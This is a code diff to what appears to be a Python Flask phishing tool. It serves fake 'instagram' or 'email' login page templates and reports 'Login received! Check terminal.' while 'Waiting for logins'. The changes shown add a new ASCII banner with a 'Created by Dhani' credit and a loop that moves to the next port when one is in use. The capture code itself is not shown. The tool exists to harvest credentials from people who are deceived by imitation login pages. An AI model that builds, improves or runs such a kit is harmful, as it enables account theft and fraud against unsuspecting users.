@@ -31,13 +31,14 @@ log.setLevel(logging.ERROR)
 def banner():
     os.system("cls" if os.name == "nt" else "clear")
     print(f"""{red}
-██████╗ ██████╗  ██████╗     
-██╔══██╗██╔══██╗██╔═══██╗    
-██████╔╝██████╔╝██║   ██║    
-██╔═══╝ ██╔═══╝ ██║   ██║    
-██║     ██║     ╚██████╔╝    
-╚═╝     ╚═╝      ╚═════╝     
-{cyan}            PRO D{reset}
+ ____  ____   ___    ____  
+|  _ \\|  _ \\ / _ \\  |  _ \\ 
+| |_) | |_) | | | | | | | |
+|  __/|  _ <| |_| | | |_| |
+|_|   |_| \\_\\\\___/  |____/ 
+
+{cyan}            PRO D
+{pink}         Created by Dhani v1.0{reset}
 """)
 
 # -------- Flask App --------
@@ -64,7 +65,19 @@ def login():
 """)
     return "Login received! Check terminal."
 
-# -------- Run --------
+# -------- Run Flask on available port --------
+def run_server():
+    port = 8080
+    while True:
+        try:
+            print(f"{grn}Server running at: {cyan}http://127.0.0.1:{port}{reset}\n")
+            print(f"{pink}Waiting for logins... Press Ctrl+C to stop.{reset}\n")
+            app.run(host="127.0.0.1", port=port, debug=False)
+            break
+        except OSError:
+            print(f"{ylo}Port {port} is in use, trying next port...{reset}")
+            port += 1
+
 if __name__ == "__main__":
     banner()
 
@@ -73,15 +86,11 @@ if __name__ == "__main__":
 ╔══════════════════════════════╗
 ║ {cyan}Choose Page Template{pink}        
 ╠══════════════════════════════╣
-║ [1] instagram                 
+║ [1] instagram                
 ║ [2] email                  
 ╚══════════════════════════════╝
 {reset}""")
     choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
     selected_html = "1.html" if choice == "1" else "2.html"
 
-    port = 8080
-    print(f"{grn}Server running at: {cyan}http://127.0.0.1:{port}{reset}\n")
-    print(f"{pink}Waiting for logins...{reset}\n")
-
-    app.run(host="127.0.0.1", port=port, debug=False)
+    run_server()
